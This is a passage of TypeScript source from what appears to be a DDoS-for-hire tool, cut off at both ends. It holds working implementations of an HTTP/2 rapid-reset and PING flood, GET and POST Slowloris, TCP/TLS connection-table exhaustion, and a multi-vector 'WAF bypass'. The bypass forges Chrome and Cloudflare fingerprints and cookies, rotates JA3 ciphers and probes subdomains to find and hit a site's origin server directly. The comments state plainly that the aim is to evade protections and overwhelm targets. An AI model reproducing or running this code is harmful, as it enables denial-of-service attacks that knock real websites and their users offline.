              stream.close(h2constants.NGHTTP2_NO_ERROR);
              localPkts++;
              localBytes += 400;
              stream.on("error", () => { /**/ });
            } catch { break; }
          }
          // ★ PING FLOOD: every 4 bursts (≈256 RST streams) inject 12 PING frames.
          // RFC 7540 §6.7: server MUST send PING ACK for every PING received.
          // 12 mandatory ACKs per 256 RST_STREAMs compounds CPU: server is
          // simultaneously processing RST queue + generating ACK responses.
          pumpCount++;
          if (pumpCount % 4 === 0 && !conn.destroyed) {
            for (let p = 0; p < 12; p++) {
              try {
                const pingData = Buffer.allocUnsafe(8);
                pingData.writeUInt32BE(randInt(0, 0x7fffffff), 0);
                pingData.writeUInt32BE(randInt(0, 0x7fffffff), 4);
                conn.ping(pingData, () => { /* ACK received — we don't care, server had to work */ });
              } catch { /**/ }
            }
            localPkts += 12; localBytes += 12 * 17; // 9-byte frame header + 8-byte payload each
          }
          if (!signal.aborted && !conn.destroyed) setImmediate(pump);
        };

        conn.on("connect", () => { pump(); });
        conn.on("error",   () => { resolve(); }); // will restart in next while iteration
        conn.on("close",   () => { resolve(); }); // will restart in next while iteration
        signal.addEventListener("abort", cleanup, { once: true });
      });
      // Brief pause before reconnect — minimum delay for maximum pressure
      if (!signal.aborted) await new Promise(r => setTimeout(r, 10 + randInt(0, 20)));
    }
  };

  await Promise.all(Array.from({ length: NUM_SESSIONS }, () => runSessionSlot()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  SLOWLORIS — real TCP connection pool exhaustion
//
//  Opens thousands of half-open HTTP connections. Each sends a partial request
//  (no final \r\n\r\n), then trickles one fake header line every 10-25s to
//  keep the connection alive without triggering timeouts.
//
//  Exhausts the server's connection pool without sending meaningful traffic.
//  Bypasses per-request rate limits — one connection per server thread slot.
//
//  Achieves 2K–8K concurrent half-open connections.
// ─────────────────────────────────────────────────────────────────────────
async function runSlowlorisReal(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number, c?: number) => void,
  useHttps = false,
): Promise<void> {
  // Deployed (32GB): threads*75, max 30K — each TLS socket ~80KB → 30K = ~2.4GB per worker
  // Non-deployed prod: threads*50, max 15K — 1.2GB per worker
  const MAX_CONN = !IS_PROD
    ? Math.min(threads * 8, 800)                                               // dev: max 800
    : IS_DEPLOYED ? Math.min(threads * 75, 30000) : Math.min(threads * 50, 15000);
  let localPkts = 0, localBytes = 0, activeConns = 0;
  const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 250);

  const oneSlowConn = (): Promise<void> => new Promise(resolve => {
    if (signal.aborted) { resolve(); return; }

    // Use TLS for HTTPS targets — plain TCP is rejected by nginx on port 443
    const sock: net.Socket = useHttps
      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
      : net.createConnection({ host: resolvedHost, port: targetPort });

    sock.setNoDelay(true);
    sock.setTimeout(180_000); // 3-minute timeout — keep alive

    let keepIv:  NodeJS.Timeout | null = null;
    let settled  = false;

    const cleanup = () => {
      if (settled) return;
      activeConns = Math.max(0, activeConns - 1);
      if (keepIv) { clearInterval(keepIv); keepIv = null; }
      try { sock.destroy(); } catch { /**/ }
      if (signal.aborted) { settled = true; resolve(); return; }
      // Just resolve — the outer async runSock loop handles reconnection
      settled = true;
      resolve();
    };

    const onConnected = () => {
      activeConns++;
      localPkts++;

      // ★ DUAL-MODE SLOWLORIS:
      // 60% classic GET Slowloris (missing final \r\n\r\n — server waits for request completion)
      // 40% POST Slowloris (sends huge Content-Length, server waits for body to arrive byte by byte)
      //
      // POST variant exploits: server allocates a body buffer of Content-Length size, then waits.
      // Apache + nginx buffer the body before handing to app — 1GB Content-Length = 1GB reserved.
      // Even body-streaming servers keep the connection slot open until Content-Length bytes received.
      const usePost = Math.random() < 0.4;

      if (usePost) {
        // POST Slowloris: complete HTTP headers, 1GB Content-Length, trickle body bytes slowly
        const postHeaders = [
          `POST ${hotPath()}?_=${randStr(8)}&v=${randInt(1, 9999999)} HTTP/1.1`,
          `Host: ${hostname}`,
          `User-Agent: ${randUA()}`,
          `Accept: text/html,application/xhtml+xml,*/*;q=0.8`,
          `Accept-Language: en-US,en;q=0.9`,
          `Accept-Encoding: gzip, deflate`,
          `X-Forwarded-For: ${randIp()}`,
          `Connection: keep-alive`,
          `Content-Type: application/x-www-form-urlencoded`,
          `Content-Length: 1073741824`, // 1GB — server waits for this many bytes
          `\r\n`, // complete headers — server now waits for 1GB of body
        ].join("\r\n");

        sock.write(postHeaders);
        localBytes += postHeaders.length;

        // Trickle body bytes every 10-25s — never completes, holds connection open
        keepIv = setInterval(() => {
          if (signal.aborted || sock.destroyed) { cleanup(); return; }
          // Send 1-4 bytes of random body data — looks like real slow upload
          const bodyChunk = `${randStr(randInt(1, 4))}`;
          sock.write(bodyChunk, (err) => {
            if (err) { cleanup(); return; }
            localPkts++;
            localBytes += bodyChunk.length;
          });
        }, randInt(8_000, 20_000)); // slightly faster trickle to stay alive longer

      } else {
        // Classic GET Slowloris — intentionally missing the final \r\n\r\n
        const partial = [
          `GET ${hotPath()}?_=${randStr(8)}&v=${randInt(1, 9999999)} HTTP/1.1`,
          `Host: ${hostname}`,
          `User-Agent: ${randUA()}`,
          `Accept: text/html,application/xhtml+xml,*/*;q=0.8`,
          `Accept-Language: en-US,en;q=0.9`,
          `Accept-Encoding: gzip, deflate`,
          `X-Forwarded-For: ${randIp()}`,
          `Connection: keep-alive`,
          `Referer: https://google.com/`,
          ``, // NO final \r\n\r\n — this is the Slowloris trick
        ].join("\r\n");

        sock.write(partial);
        localBytes += partial.length;

        // Trickle a junk header every 10-25s to prevent server timeout
        keepIv = setInterval(() => {
          if (signal.aborted || sock.destroyed) { cleanup(); return; }
          const hdr = `X-${randStr(5)}-${randStr(3)}: ${randStr(randInt(8, 20))}\r\n`;
          sock.write(hdr, (err) => {
            if (err) { cleanup(); return; }
            localPkts++;
            localBytes += hdr.length;
          });
        }, randInt(10_000, 25_000));
      }
    };

    // TLS emits 'secureConnect', plain TCP emits 'connect'
    if (useHttps) {
      (sock as tls.TLSSocket).once("secureConnect", onConnected);
    } else {
      sock.once("connect", onConnected);
    }

    sock.once("error",   cleanup);
    sock.once("timeout", cleanup);
    sock.once("close",   cleanup);

    signal.addEventListener("abort", () => {
      if (keepIv) { clearInterval(keepIv); keepIv = null; }
      try { sock.destroy(); } catch { /**/ }
      if (!settled) { settled = true; resolve(); }
    }, { once: true });
  });

  const runSock = async (): Promise<void> => {
    while (!signal.aborted) {
      await oneSlowConn();
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 5));
    }
  };

  await Promise.all(Array.from({ length: MAX_CONN }, runSock));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  CONNECTION FLOOD — pure TCP/TLS connection table exhaustion
//  Opens MAX_CONN connections, completes TLS handshake, holds them open
//  Bypasses ALL HTTP-level rate limiting (nginx limit_req, Cloudflare, etc)
//  because rate limiting only applies AFTER connection is accepted and
//  request headers are parsed. We fill connection slots BEFORE any HTTP.
//  Nginx default: worker_connections 1024 × N workers = ~4096 total.
// ─────────────────────────────────────────────────────────────────────────
async function runConnFlood(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number, c?: number) => void,
  useHttps = false,
  proxies: ProxyConfig[] = [],
): Promise<void> {
  // Deployed (32GB): threads*60, max 20K — 20K × 80KB = 1.6GB per worker
  // Non-deployed prod: threads*40, max 12K — 960MB per worker
  const MAX_CONN = !IS_PROD
    ? Math.min(threads * 8, 800)                                               // dev: max 800
    : IS_DEPLOYED ? Math.min(threads * 60, 20000) : Math.min(threads * 40, 12000);
  let localPkts = 0, localBytes = 0, activeConns = 0, pIdx = 0;
  const flush = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 250);

  const oneConnFlood = async (): Promise<void> => {
    if (signal.aborted) return;
    let sock: net.Socket;
    if (useHttps) {
      sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["http/1.1"],
        { ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:ECDHE-RSA-AES128-GCM-SHA256" });
    } else {
      sock = net.createConnection({ host: resolvedHost, port: targetPort });
    }
    sock.setNoDelay(true);
    sock.setTimeout(120_000); // 2-minute hold — maximizes time connection slot is occupied

    return new Promise<void>(resolve => {
    let settled = false;
    const cleanup = () => {
      if (settled) return;
      activeConns = Math.max(0, activeConns - 1);
      try { sock.destroy(); } catch { /**/ }
      settled = true;
      resolve(); // outer async runSock while-loop handles reconnect
    };

    const onConnected = () => {
      activeConns++;
      localPkts++;
      // Incomplete HTTP/1.1 request — server holds thread waiting for rest of headers
      // Varying paths and IPs defeats simple duplicate-detection filters
      const minReq = [
        `GET ${hotPath()}?_=${randStr(8)} HTTP/1.1`,
        `Host: ${hostname}`,
        `User-Agent: ${randUA()}`,
        `Accept: text/html,application/xhtml+xml,*/*;q=0.9`,
        `Accept-Encoding: gzip, deflate, br`,
        `X-Forwarded-For: ${randIp()}`,
        `X-Real-IP: ${randIp()}`,
        `Connection: keep-alive`,
        `Cookie: session=${randHex(32)}; _ga=GA1.${randInt(1,9)}.${randInt(100000000,999999999)}.${Date.now()}`,
        ``, // intentionally NO final \r\n — server waits forever
      ].join("\r\n");
      sock.write(minReq);
      localBytes += minReq.length;
    };

    if (useHttps) {
      (sock as tls.TLSSocket).once("secureConnect", onConnected);
    } else {
      sock.once("connect", onConnected);
    }

    sock.once("error",   cleanup);
    sock.once("timeout", cleanup);
    sock.once("close",   cleanup);

    signal.addEventListener("abort", () => {
      try { sock.destroy(); } catch { /**/ }
      if (!settled) { settled = true; resolve(); }
    }, { once: true });
    }); // end inner Promise
  }; // end oneConnFlood

  const runSock = async (): Promise<void> => {
    while (!signal.aborted) {
      await oneConnFlood();
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, randInt(5, 20)));
    }
  };

  await Promise.all(Array.from({ length: MAX_CONN }, runSock));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  GEASS WAF BYPASS — Cloudflare / Akamai / AWS Shield evasion
//
//  Four-layer evasion technique:
//  1. JA3 TLS fingerprint randomization (cipher suite order per-session)
//  2. Chrome-exact HTTP/2 AKAMAI fingerprint (SETTINGS frame values)
//  3. Chrome-exact header ordering (Cloudflare checks header order, not just values)
//  4. Realistic Cloudflare cookie simulation (__cf_bm, __cfruid, cf_clearance)
//
//  Combined effect: each connection looks like a distinct Chrome browser
//  from a different user — impossible to distinguish from real traffic.
//  Works best with proxy rotation (residential IPs bypass IP reputation).
// ─────────────────────────────────────────────────────────────────────────

// Chrome TLS cipher suites — TLS1.3 fixed first, TLS1.2 shuffled per-session
const CF_CIPHERS_TLS13 = [
  "TLS_AES_128_GCM_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "TLS_CHACHA20_POLY1305_SHA256",
];
const CF_CIPHERS_TLS12 = [
  "ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-RSA-AES128-GCM-SHA256",
  "ECDHE-ECDSA-AES256-GCM-SHA384", "ECDHE-RSA-AES256-GCM-SHA384",
  "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-CHACHA20-POLY1305",
  "ECDHE-RSA-AES128-SHA",          "ECDHE-RSA-AES256-SHA",
  "AES128-GCM-SHA256",             "AES256-GCM-SHA384",
  "AES128-SHA",                    "AES256-SHA",
];
function randomJA3Ciphers(): string {
  const shuffled = [...CF_CIPHERS_TLS12].sort(() => Math.random() - 0.5);
  return [...CF_CIPHERS_TLS13, ...shuffled].join(":");
}

// Chrome browser profiles — Chrome 130-135 (current as of April 2026)
// Includes sec-ch-ua-arch, sec-ch-ua-bitness, sec-ch-ua-wow64 for maximum fingerprint fidelity
const CHROME_PROFILES = [
  { ver: "130", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="130", "Chromium";v="130", "Not-A.Brand";v="99"', mobile: false, arch: '"x86"',   bitness: '"64"', wow64: "?0" },
  { ver: "131", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="131", "Chromium";v="131", "Not-A.Brand";v="24"', mobile: false, arch: '"x86"',   bitness: '"64"', wow64: "?0" },
  { ver: "132", ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36", plat: '"macOS"',   brand: '"Google Chrome";v="132", "Chromium";v="132", "Not-A.Brand";v="24"', mobile: false, arch: '"x86"',   bitness: '"64"', wow64: "?0" },
  { ver: "133", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="133", "Chromium";v="133", "Not-A.Brand";v="24"', mobile: false, arch: '"x86"',   bitness: '"64"', wow64: "?0" },
  { ver: "134", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="134", "Chromium";v="134", "Not-A.Brand";v="24"', mobile: false, arch: '"x86"',   bitness: '"64"', wow64: "?0" },
  { ver: "135", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",       plat: '"Windows"', brand: '"Google Chrome";v="135", "Chromium";v="135", "Not-A.Brand";v="24"', mobile: false, arch: '"x86"',   bitness: '"64"', wow64: "?0" },
  { ver: "135", ua: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36", plat: '"macOS"',   brand: '"Google Chrome";v="135", "Chromium";v="135", "Not-A.Brand";v="24"', mobile: false, arch: '"arm"',   bitness: '"64"', wow64: "?0" },
  { ver: "134", ua: "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",                 plat: '"Linux"',   brand: '"Google Chrome";v="134", "Chromium";v="134", "Not-A.Brand";v="24"', mobile: false, arch: '"x86"',   bitness: '"64"', wow64: "?0" },
  { ver: "134", ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36 Edg/134.0.0.0", plat: '"Windows"', brand: '"Microsoft Edge";v="134", "Chromium";v="134", "Not-A.Brand";v="24"', mobile: false, arch: '"x86"', bitness: '"64"', wow64: "?0" },
  { ver: "133", ua: "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36", plat: '"Android"', brand: '"Google Chrome";v="133", "Chromium";v="133", "Not-A.Brand";v="24"', mobile: true,  arch: '"arm"',   bitness: '"64"', wow64: "?0" },
  { ver: "135", ua: "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/135.0.0.0 Mobile/15E148 Safari/604.1", plat: '"iOS"', brand: '"Google Chrome";v="135", "Chromium";v="135", "Not-A.Brand";v="24"', mobile: true, arch: '"arm"', bitness: '"64"', wow64: "?0" },
];

// Chrome-exact HTTP/2 SETTINGS (AKAMAI fingerprint)
// Real Chrome sends these exact values — bots send defaults (4096, 65535, etc.)
const CHROME_H2_SETTINGS = {
  headerTableSize:      65536,    // Chrome: 65536 (default is 4096 — dead giveaway)
  enablePush:           false,    // Chrome: ENABLE_PUSH=0
  initialWindowSize:    6291456,  // Chrome: 6MB (default 65535 — major fingerprint)
  maxConcurrentStreams: 1000,     // Chrome: 1000
  maxHeaderListSize:    262144,   // Chrome: 262144 (default unset)
};

// Chrome-exact header order for HTTP/2 (AKAMAI checks header order)
// Cloudflare's Akamai fingerprinter hashes the header order — must match Chrome exactly
function buildWAFHeaders(
  hostname:  string,
  path:      string,
  cookieJar: Map<string, string>,
  profile?:  typeof CHROME_PROFILES[0],
): Record<string, string> {
  const p = profile ?? CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];

  // Realistic CF cookies — Cloudflare sets these via JS challenge
  const cfbm    = `${randHex(43)}.${Math.floor(Date.now()/1000)}-0-${randHex(8)}`;
  const cfruid  = randHex(40);
  const cfClear = `${randHex(100)}_${randInt(1,9)}`;
  const gaId    = `GA1.1.${randInt(100000000,999999999)}.${Math.floor(Date.now()/1000) - randInt(0,86400)}`;
  const gid     = `GA1.1.${randInt(100000000,999999999)}.${Math.floor(Date.now()/1000)}`;

  // Carry over any server-set cookies from the per-session cookie jar
  const jarCookies = [...cookieJar.entries()].map(([k,v]) => `${k}=${v}`).join("; ");

  const cookie = [
    `__cf_bm=${cfbm}`,
    `__cfruid=${cfruid}`,
    `cf_clearance=${cfClear}`,
    `_ga=${gaId}`,
    `_gid=${gid}`,
    `_ga_${randStr(8).toUpperCase()}=GS1.1.${Math.floor(Date.now()/1000)}.1.1.${Math.floor(Date.now()/1000)}.0.0.0`,
    jarCookies,
  ].filter(Boolean).join("; ");

  // Direct navigation is most common for repeat visitors; search engines occasionally
  const referers = [
    `https://www.google.com/search?q=${encodeURIComponent(randStr(8))}`,
    `https://www.bing.com/search?q=${encodeURIComponent(randStr(8))}`,
    `https://www.google.com/`,
    "", "", "", "", "",  // direct navigation — most common
  ];
  const referer = referers[randInt(0, referers.length)];

  // sec-fetch-user: ?1 is ONLY sent by Chrome on top-level user-initiated navigations.
  // Sending it on every request is a well-known bot fingerprint.
  const isUserInitiated = Math.random() < 0.42;

  // EXACT Chrome header order for HTTP/2 — this is the AKAMAI fingerprint
  const h: Record<string, string> = {
    // Pseudo-headers (HTTP/2 spec — always first)
    ":method":    Math.random() < 0.92 ? "GET" : "POST",
    ":authority": hostname,
    ":scheme":    "https",
    ":path":      path,
    // Real headers in Chrome's EXACT order (Akamai fingerprinter checks order + values)
    "sec-ch-ua":                        p.brand,
    "sec-ch-ua-mobile":                 p.mobile ? "?1" : "?0",
    "sec-ch-ua-platform":               p.plat,
    "upgrade-insecure-requests":        "1",
    "user-agent":                       p.ua,
    "accept":                           "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "sec-fetch-site":                   referer ? "cross-site" : "none",
    "sec-fetch-mode":                   "navigate",
    ...(isUserInitiated ? { "sec-fetch-user": "?1" } : {}),
    "sec-fetch-dest":                   "document",
    "accept-encoding":                  "gzip, deflate, br, zstd",
    "accept-language":                  ["en-US,en;q=0.9", "en-GB,en;q=0.9,en;q=0.8", "pt-BR,pt;q=0.9,en;q=0.8", "es-ES,es;q=0.9,en;q=0.8"][randInt(0,4)],
    "cookie":                           cookie,
    "cache-control":                    "max-age=0",
    "priority":                         "u=0, i",
    // Chrome high-entropy client hints (sent after first Sec-CH-UA-* handshake)
    "sec-ch-ua-arch":                   p.arch,
    "sec-ch-ua-bitness":                p.bitness,
    "sec-ch-ua-wow64":                  p.wow64,
    "sec-ch-ua-full-version-list":      p.brand.replace(/";v="/g, `";v="${p.ver}.0.0.`).replace(/\.Brand";v="[^"]+"/g, '.Brand";v="8.0.0.0"'),
  };
  if (referer) h["referer"] = referer;
  return h;
}

// Realistic paths a browser would visit (not API endpoints — those raise suspicion)
const WAF_PATHS = [
  "/", "/about", "/contact", "/faq", "/privacy", "/terms-of-service",
  "/blog", "/news", "/products", "/services", "/pricing", "/features",
  "/docs", "/help", "/support", "/login", "/register", "/signup",
  "/api/v1/status", "/api/health", "/sitemap.xml", "/robots.txt",
  "/wp-login.php", "/admin", "/dashboard", "/account", "/profile",
  "/search", "/cart", "/checkout", "/orders", "/categories",
];

// ─────────────────────────────────────────────────────────────────────────
//  GEASS WAF OMNIVECT ∞ — 7-vector internal architecture
//
//  VECTOR I:   Chrome H2 Primary Flood — max RPS, 256 streams/conn, 10-80ms reconnect
//  VECTOR II:  Subresource Storm — per page: 15-18 asset requests (CSS/JS/img/font/API)
//              Multiplies effective rate 15-18× vs. single-page floods
//  VECTOR III: Cache Annihilator — unique URL + Vary dims + POST bodies = 100% origin miss
//  VECTOR IV:  Session Amplifier — full 5-step user journeys (forces DB + session state)
//  VECTOR V:   Origin Direct Fire — DNS subdomain enum to find real IP, bypass CF edge
//  VECTOR VI:  H2 Stream Drain (64 streams) — holds server RAM buffers indefinitely
//  VECTOR VII: Adaptive Burst Mode — fires at T+20s, 15s waves at 1.6/1.8/2.0× rate
//
//  Combined: indistinguishable from real user traffic at Cloudflare edge while
//  simultaneously overwhelming origin server through all available attack surfaces.
// ─────────────────────────────────────────────────────────────────────────
async function runWAFBypass(
  base: string,
  threads: number,
  proxies: ProxyConfig[],
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const { connect: h2connect } = await import("node:http2");

  const u = (() => {
    try { return new URL(/^https?:\/\//i.test(base) ? base : `https://${base}`); }
    catch { return new URL("https://127.0.0.1"); }
  })();
  const hostname   = u.hostname;
  const resolvedIp = await resolveHost(hostname).catch(() => hostname);
  const target     = `https://${resolvedIp}:443`;

  // ── VECTOR V prep: Origin IP discovery (runs concurrently) ──────────────
  // CF IP ranges — any server IP outside these = naked origin (no WAF protection)
  const CF_PREFIXES = [
    "103.21.244","103.22.200","103.31.4","104.16","104.17","104.18","104.19",
    "108.162.192","108.162.193","131.0.72","141.101.64","141.101.65",
    "172.64","172.65","172.66","172.67","172.68","172.69","172.70","172.71",
    "173.245.48","173.245.49","188.114.96","188.114.97","188.114.98","188.114.99",
    "190.93.240","190.93.241","190.93.242","190.93.243","197.234.240","197.234.241",
    "198.41.128","198.41.129","198.41.130","198.41.131","198.41.132","198.41.133",
  ];
  const isCFip = (ip: string) => CF_PREFIXES.some(p => ip.startsWith(p + ".") || ip.startsWith(p + ":"));

  let originTarget = target;
  void (async () => {
    const subs = ["mail","ftp","smtp","pop","imap","origin","direct","cpanel","whm",
                  "webmail","old","dev","staging","api","backend","app","server",
                  "www2","ns1","ns2","shop","portal","admin","vpn","mx"];
    for (const sub of subs) {
      if (signal.aborted) return;
      try {
        const ip = await resolveHost(`${sub}.${hostname}`).catch(() => "");
        if (ip && !isCFip(ip) && ip !== resolvedIp) {
          originTarget = `https://${ip}:443`;
          return;
        }
      } catch { /* subdomain not found */ }
    }
  })();

  // ── Thread budget — 7-vector split ──────────────────────────────────────
  const primaryT  = Math.max(1, Math.floor(threads * 0.30));
  const subresT   = Math.max(1, Math.floor(threads * 0.25));
  const cacheT    = Math.max(1, Math.floor(threads * 0.18));
  const sessionT  = Math.max(1, Math.floor(threads * 0.14));
  const drainT    = Math.max(1, Math.floor(threads * 0.08));
  // Vector V (origin direct) uses primary slots once origin found

  const NUM_PRIMARY = Math.min(primaryT * 5, 1500);
  const NUM_SUBRES  = Math.min(subresT  * 4, 1200);
  const NUM_CACHE   = Math.min(cacheT   * 4, 900);
  const NUM_SESSION = Math.min(sessionT * 3, 600);
  const NUM_DRAIN   = Math.min(drainT   * 4, 400);
  const STREAMS_PER = Math.min(256, Math.max(32, primaryT * 2));

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  // ── VECTOR I: Chrome H2 Primary Flood + VECTOR VIII: JA3 Fingerprint Rotation ──
  // 256 streams/connection, 10-80ms reconnect. Each connection gets a fresh JA3
  // cipher suite from randomJA3Ciphers(). MAX_CONN_LIFE = 30s forces reconnect
  // even on long-running idle connections → continuous fingerprint rotation.
  // Cloudflare/Akamai fingerprint-based blocking can't keep up with rotating JA3.
  const MAX_CONN_LIFE_MS = 30_000; // ★ VECTOR VIII: force reconnect every 30s → fresh JA3
  const runPrimarySlot = async (tgt = target): Promise<void> => {
    const sessionProfile = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
    const cookieJar      = new Map<string, string>();
    while (!signal.aborted) {
      await new Promise<void>(resolve => {
        let c: ReturnType<typeof h2connect> | null = null;
        try {
          c = h2connect(tgt, {
            rejectUnauthorized: false,
            servername:         hostname,
            ciphers:            randomJA3Ciphers(), // ★ fresh JA3 fingerprint each reconnect
            settings:           CHROME_H2_SETTINGS,
            ALPNProtocols:      ["h2", "http/1.1"],
          });
        } catch { resolve(); return; }
        // ★ Force reconnect after 30s even if connection is healthy (fingerprint rotation)
        const conn    = c;
        const lifeTimer = setTimeout(() => { try { conn.destroy(); } catch { /**/ } resolve(); }, MAX_CONN_LIFE_MS);
        const cleanup = () => { clearTimeout(lifeTimer); try { conn.destroy(); } catch { /**/ } resolve(); };
        let inflight  = 0;
        const pump = () => {
          if (signal.aborted || conn.destroyed) { resolve(); return; }
          while (!signal.aborted && !conn.destroyed && inflight < STREAMS_PER) {
            inflight++;
            const pagePath = WAF_PATHS[randInt(0, WAF_PATHS.length)];
            const usePost  = Math.random() < 0.22;
            const path     = pagePath + (usePost ? "" : `?v=${randInt(1,9999999)}&_=${randStr(6)}`);
            try {
              const hdrs = buildWAFHeaders(hostname, path, cookieJar, sessionProfile);
              if (usePost) hdrs[":method"] = "POST";
              const stream = conn.request(hdrs);
              if (usePost) stream.write(JSON.stringify({ q: randStr(8), t: Date.now() }));
              stream.on("response", (resHdrs: Record<string, string | string[]>) => {
                localPkts++; localBytes += 2048;
                const sc = resHdrs["set-cookie"];
                if (sc) {
                  (Array.isArray(sc) ? sc : [sc]).forEach(cv => {
                    const [kv] = cv.split(";"); const [k, v] = kv.split("=");
                    if (k && v) cookieJar.set(k.trim(), v.trim());
                  });
                }
              });
              stream.on("data",  () => {});
              stream.on("error", () => { inflight = Math.max(0, inflight - 1); if (!signal.aborted) setImmediate(pump); });
              stream.on("close", () => { inflight = Math.max(0, inflight - 1); if (!signal.aborted) setImmediate(pump); });
              stream.end();
            } catch { inflight--; break; }
          }
        };
        conn.on("connect", pump);
        conn.on("error",   () => resolve());
        conn.on("close",   () => resolve());
        signal.addEventListener("abort", cleanup, { once: true });
      });
      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(10, 80)));
    }
  };

  // ── VECTOR II: Subresource Storm ─────────────────────────────────────────
  // Real browsers fire 15-18 sub-requests after each HTML page load.
  // Each sub-resource = separate origin hit. Multiplies RPS 15-18× passively.
  const SUB_TYPES = [
    { path: "/assets/bundle.js",          accept: "*/*",                        dest: "script"   },
    { path: "/assets/main.css",           accept: "text/css,*/*;q=0.1",        dest: "style"    },
    { path: "/assets/logo.webp",          accept: "image/avif,image/webp,*/*", dest: "image"    },
    { path: "/assets/hero.jpg",           accept: "image/avif,image/webp,*/*", dest: "image"    },
    { path: "/api/v1/config",             accept: "application/json",          dest: "fetch"    },
    { path: "/api/v1/user/me",            accept: "application/json",          dest: "fetch"    },
    { path: "/fonts/inter-v13.woff2",     accept: "*/*",                        dest: "font"     },
    { path: "/api/v1/products",           accept: "application/json",          dest: "fetch"    },
    { path: "/static/chunk-1.js",         accept: "*/*",                        dest: "script"   },
    { path: "/static/chunk-2.js",         accept: "*/*",                        dest: "script"   },
    { path: "/api/v1/cart",               accept: "application/json",          dest: "fetch"    },
    { path: "/api/v1/session",            accept: "application/json",          dest: "fetch"    },
    { path: "/favicon.ico",               accept: "image/avif,image/webp,*/*", dest: "image"    },
    { path: "/manifest.json",             accept: "application/json",          dest: "fetch"    },
    { path: "/api/v1/search",             accept: "application/json",          dest: "fetch"    },
    { path: "/assets/vendor.js",          accept: "*/*",                        dest: "script"   },
    { path: "/api/analytics",             accept: "application/json",          dest: "fetch"    },
    { path: "/api/v1/recommendations",   accept: "application/json",          dest: "fetch"    },
  ];
  const runSubresourceSlot = async (): Promise<void> => {
    const p         = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
    const cookieJar = new Map<string, string>();
    while (!signal.aborted) {
      await new Promise<void>(resolve => {
        let c: ReturnType<typeof h2connect> | null = null;
        try {
          c = h2connect(target, {
            rejectUnauthorized: false, servername: hostname,
            ciphers: randomJA3Ciphers(), settings: CHROME_H2_SETTINGS,
            ALPNProtocols: ["h2", "http/1.1"],
          });
        } catch { resolve(); return; }
        const conn    = c;
        const cleanup = () => { try { conn.destroy(); } catch { /**/ } resolve(); };
        let inflight  = 0;
        const MAX_SUB = Math.min(STREAMS_PER, 200);

        const fireSub = (sub: typeof SUB_TYPES[0]) => {
          if (signal.aborted || conn.destroyed || inflight >= MAX_SUB) return;
          inflight++;
          const path = sub.path + `?v=${randStr(8)}&t=${Date.now()}`;
          const hdrs = {
            ...buildWAFHeaders(hostname, path, cookieJar, p),
            "accept":         sub.accept,
            "sec-fetch-mode": sub.dest === "fetch" ? "cors" : "no-cors",
            "sec-fetch-dest": sub.dest,
            "sec-fetch-site": "same-origin",
          };
          try {
            const stream = conn.request(hdrs);
            stream.on("data",     () => {});
            stream.on("response", () => { localPkts++; localBytes += 512; });
            stream.on("error",    () => { inflight = Math.max(0, inflight - 1); });
            stream.on("close",    () => { inflight = Math.max(0, inflight - 1); });
            stream.end();
          } catch { inflight--; }
        };

        conn.on("connect", () => {
          // First: the HTML page
